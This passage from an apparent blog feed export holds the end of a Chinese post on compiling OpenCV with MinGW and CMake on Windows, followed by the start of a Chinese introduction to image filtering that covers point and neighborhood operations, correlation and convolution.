<li>BUILD_OPENEXR – 取消勾选</li>
<li>OPENCV_ENABLE_ALLOCATOR_STATS – 取消勾选</li>
<li>CMAKE_BUILD_TYPE – RELEASE</li>
<li>CMAKE_INSTALL_PREFIX – 填上<strong>安装路径</strong>比如<code>D:/repo/opencv/install</code></li>
<li>OPENCV_EXTRA_MODULES_PATH - 填上opencv_contrib module的路径，比如<code>D:/repo/opencv_contrib/modules</code></li>
</ul>
<p>完成选项设置后，摁<code>Generate</code>按钮生成makefile</p>
<p>等待makefile生成完成后。cmd进入你设置的build文件夹 (<code>D:/repo/opencv/build</code>)</p>
<p>然后使用make命令开始编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mingw32-make.exe</span><br></pre></td></tr></table></figure>

<p>整个编译过程可能持续数小时（到几天）</p>
<p>完成make后，使用make install来安装opencv到你前面设置的路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mingw32-make.exe install</span><br></pre></td></tr></table></figure>

<p>最后把opencv install完成之后生成的bin文件夹加入系统的path即可。</p>
<p>比如 <code>D:/repo/opencv/install/x64/mingw/bin</code></p>
<h1 id="食用OpenCV"><a href="#食用OpenCV" class="headerlink" title="食用OpenCV"></a>食用OpenCV</h1><p>在cmake中添加如下文本即可</p>
<p><code>OpenCV_DIR</code> 就是上文里自己设置的安装路径</p>
<p>你可以在cmakelist里手动设置<code>OpenCV_DIR</code>的位置，也可以用cmake-gui，然后选择安装路径。</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># OpenCV</span></span><br><span class="line"><span class="comment"># set(OpenCV_DIR &quot;D:/repo/opencv/install&quot;) # manually set opencv dir</span></span><br><span class="line"><span class="keyword">find_package</span>(OpenCV REQUIRED)</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">NOT</span> OpenCV_FOUND)</span><br><span class="line">    <span class="keyword">message</span>(FATAL_ERROR <span class="string">&quot;OpenCV is required&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span> ()</span><br><span class="line"><span class="keyword">include_directories</span>( <span class="variable">$&#123;OpenCV_INCLUDE_DIRS&#125;</span> )</span><br><span class="line"><span class="keyword">target_link_libraries</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PRIVATE <span class="variable">$&#123;OpenCV_LIBS&#125;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><ul>
<li>OpenCV cuda在windows下无法使用mingw进行编译</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="https://support.xilinx.com/s/article/000035890">https://support.xilinx.com/s/article/000035890</a></li>
</ol>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>opencv</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机视觉基础: Filtering (滤波)</title>
    <url>/articles/coding/computer-vision-basic-filter/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在数字图像处理中，滤波是一个基本且关键的操作。滤波不仅用于增强图像质量，还在诸如去噪、边缘检测和图像分割等高级任务中扮演着重要角色。本文将简单的探讨线性与非线性滤波的基本概念、实现方法及其在计算机视觉中的应用。</p>
<span id="more"></span>

<h1 id="现实图像在数字世界的表示"><a href="#现实图像在数字世界的表示" class="headerlink" title="现实图像在数字世界的表示"></a>现实图像在数字世界的表示</h1><p>我们知道，图片实际上就是一个颜色的强度在一个点阵上的值，比如灰度图可以说成是一个点阵上每个点上的光线强度。彩色图，通常就是一个点阵里每个点上红光绿光蓝光(RGB)的光线强度。而这个强度值在计算机中通常用uint8，也就是0-255表示。</p>
<p>比如我们拿灰度图做例子，即只有一个通道，大小为M x N的图片，就可以很自然的表示为 I(X, Y)，其中 (X, Y) ∈ ([1, M], [1, N])</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_194844.png"></p>
<h1 id="图像的处理"><a href="#图像的处理" class="headerlink" title="图像的处理"></a>图像的处理</h1><p>获得图像的数学表示后，我们可以通过数学运算对图像进行各种处理。根据操作是针对函数的定义域(domain)还是值域(range)，图像处理操作大致可以分为以下两类：</p>
<h2 id="Warping-变形"><a href="#Warping-变形" class="headerlink" title="Warping (变形)"></a>Warping (变形)</h2><p>变形操作涉及对图像的空间结构进行修改，如旋转、缩放和扭曲。这类操作改变了函数的<strong>定义域</strong>，使得图像在几何上发生变换。例如，图像校正就是一种变形操作，它用于消除镜头畸变，确保图像中的直线在变换后仍然保持直线。</p>
<h2 id="Filtering-滤波"><a href="#Filtering-滤波" class="headerlink" title="Filtering (滤波)"></a>Filtering (滤波)</h2><p>滤波操作则是对图像的像素值进行修改，改变函数的<strong>值域</strong>。这类操作包括图像增强（如锐化、对比度调整）以及特定问题的解决（如模式识别、对象检测）。</p>
<h3 id="Point-Operation-点运算"><a href="#Point-Operation-点运算" class="headerlink" title="Point Operation (点运算)"></a>Point Operation (点运算)</h3><p>点运算是最基本的滤波操作，它对图像中的每个像素独立应用一个函数：</p>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I&#x27;(X, Y) = g(I(X, Y))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">))</span></span></span></span>

<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_212613.png"></p>
<blockquote>
<p>Credit: Ioannis (Yannis) Gkioulekas (CMU)</p>
</blockquote>
<p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g(x) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 是应用于每个像素值的操作。例如：</p>
<ul>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mo>−</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">g(x) = x - c </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span> 可以使图像变暗；</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mi>x</mi><mi>c</mi></mfrac></mrow><annotation encoding="application/x-tex">g(x) = \frac{x}{c}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>  for <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><mo>&gt;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( c &gt; 1 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>可以降低对比度；</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mi>x</mi><mi>c</mi></mfrac></mrow><annotation encoding="application/x-tex">g(x) = \frac{x}{c}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>  for <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><mo>&lt;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( c &lt; 1 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>可以增加对比度。</li>
</ul>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_214153.png"><br><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_214203.png"></p>
<h3 id="Neighborhood-operation-邻域运算"><a href="#Neighborhood-operation-邻域运算" class="headerlink" title="Neighborhood operation (邻域运算)"></a>Neighborhood operation (邻域运算)</h3><p>邻域运算则考虑像素周围的邻域信息，对输出像素进行计算：</p>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo>−</mo><mi>k</mi><mo>:</mo><mi>X</mi><mo>+</mo><mi>k</mi><mo separator="true">,</mo><mi>Y</mi><mo>−</mo><mi>k</mi><mo>:</mo><mi>Y</mi><mo>+</mo><mi>k</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I&#x27;(X, Y) = g(I(X - k : X + k, Y - k : Y + k))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">))</span></span></span></span>

<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_212749.png"></p>
<blockquote>
<p>Credit: Ioannis (Yannis) Gkioulekas (CMU)</p>
</blockquote>
<p>这里，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><mi>M</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">k = (M - 1)/2 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/2</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">M \times M </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 是邻域的大小，且一般来说假设M为奇数，假设 M 为奇数的主要可以让滤波更加的简单直观。例如，无论从左到右还是从右到左，应用奇数尺寸滤波器的结果都是一样的。</p>
<p>同时邻域运算比点运算更强大，因为它考虑了局部区域的信息。</p>
<h1 id="Linear-Filter-线性滤波"><a href="#Linear-Filter-线性滤波" class="headerlink" title="Linear Filter (线性滤波)"></a>Linear Filter (线性滤波)</h1><p>但不管是点运算还是邻域运算，这些操作都可被分为线性(linear)和非线性(non-linear)。</p>
<p>其中线性滤波是滤波操作中最常见的一类，它通过一个线性滤波器(Kernel)对图像进行处理。滤波器通常表示为一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">M \times M </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>  的矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(X, Y) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>，其中心位于滤波器的中心位置。线性滤波的输出可以通过相关运算或卷积运算来实现。</p>
<h2 id="Correlation"><a href="#Correlation" class="headerlink" title="Correlation"></a>Correlation</h2><p>Correlation是线性滤波的一种基本形式，计算方式如下：</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mo>−</mo><mi>k</mi></mrow><mi>k</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mo>−</mo><mi>k</mi></mrow><mi>k</mi></msubsup><mi>F</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>⋅</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo>+</mo><mi>i</mi><mo separator="true">,</mo><mi>Y</mi><mo>+</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I&#x27;(X, Y) = \sum_{i=-k}^{k} \sum_{j=-k}^{k} F(i, j) \cdot I(X + i, Y + j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4248em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_220349.png"></p>
<h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_221309.png"></p>
<p>如果m不是很大，那么复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，</p>
<p>如果m接近n，那么复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>4</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^4)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
<h2 id="Convolution-卷积"><a href="#Convolution-卷积" class="headerlink" title="Convolution (卷积)"></a>Convolution (卷积)</h2><p>卷积(Convolution)是一种类似与Correlation的数学运算，但是他有更多数学上的特性。</p>
<p>在实际操作中，通常通过旋转滤波器180度后再进行Correlation来实现卷积。</p>
